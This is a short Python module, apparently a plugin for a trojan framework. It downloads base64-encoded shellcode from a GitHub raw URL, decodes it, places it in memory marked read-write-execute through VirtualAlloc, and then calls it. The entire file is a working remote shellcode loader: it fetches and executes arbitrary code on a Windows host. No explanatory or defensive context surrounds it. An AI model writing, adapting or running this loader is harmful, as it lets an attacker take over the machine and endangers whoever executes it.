import ctypes
import base64
import urllib.request

def run(**args):
    try:
        url = "https://raw.githubusercontent.com/leducymta/bhptrojan/master/shellcode/shellcode.b64"
        encoded = urllib.request.urlopen(url).read()
        shellcode = base64.b64decode(encoded)
        size = len(shellcode)

        kernel32 = ctypes.windll.kernel32
        ptr = kernel32.VirtualAlloc(
            None, size,
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not ptr:
            return "[!] Failed to allocate memory"

        buffer = ctypes.create_string_buffer(shellcode, size)
        ctypes.memmove(ptr, buffer, size)

        shell_func = ctypes.CFUNCTYPE(None)(ptr)
        shell_func()

        return "[✓] Shellcode executed successfully"

    except Exception as e:
        return f"[!] Shellcode execution failed: {str(e)}"

